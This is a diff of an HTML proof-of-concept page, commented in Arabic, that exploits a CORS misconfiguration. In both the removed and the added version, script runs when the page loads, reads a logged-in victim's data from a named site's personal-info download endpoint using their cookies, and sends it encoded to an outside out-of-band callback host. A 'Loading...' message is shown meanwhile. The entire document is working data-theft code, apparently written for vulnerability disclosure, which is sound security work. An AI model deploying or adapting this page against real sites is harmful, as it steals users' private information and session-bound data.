@@ -1,16 +1,38 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Data Theft PoC</title>
+</head>
 <body>
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://ptl-94a8e0ee761c-97cb36c29d49.libcurl.me/api/v1/keys", false);
-xhr.withCredentials = true;
-xhr.send();
-var a = xhr.responseText;
+    <script>
+        // إعدادات الهجوم
+        const TARGET_ENDPOINT = "https://pics.io/users/personalInfo?download";
+        const ATTACKER_SERVER = "https://wlikmodtjuxpisuqbswjvxs2tboi59zla.oast.fun";
 
-var xhr2 = new XMLHttpRequest();
-xhr2.open("GET", "http://wlikmodtjuxpisuqbswjvxs2tboi59zla.oast.fun/" + a, false);
-xhr2.withCredentials = true;
-xhr2.send();
-</script>
+        function conductExploit() {
+            // الخطوة 1: قراءة البيانات الحساسة باستخدام كوكيز الضحية
+            fetch(TARGET_ENDPOINT, {
+                method: 'GET',
+                credentials: 'include' // إرسال الكوكيز والـ Session
+            })
+            .then(response => response.text())
+            .then(data => {
+                // الخطوة 2: تهريب البيانات المسروقة إلى سيرفر المهاجم (OAST)
+                fetch(ATTACKER_SERVER + "/leak?data=" + btoa(unescape(encodeURIComponent(data))), {
+                    method: 'GET',
+                    mode: 'no-cors'
+                });
+                console.log("Exfiltration complete.");
+            })
+            .catch(err => {
+                console.error("Exploit failed:", err);
+            });
+        }
+
+        // تنفيذ الهجوم بمجرد تحميل الصفحة
+        window.onload = conductExploit;
+    </script>
+    <h1>Loading... please wait.</h1>
 </body>
 </html>
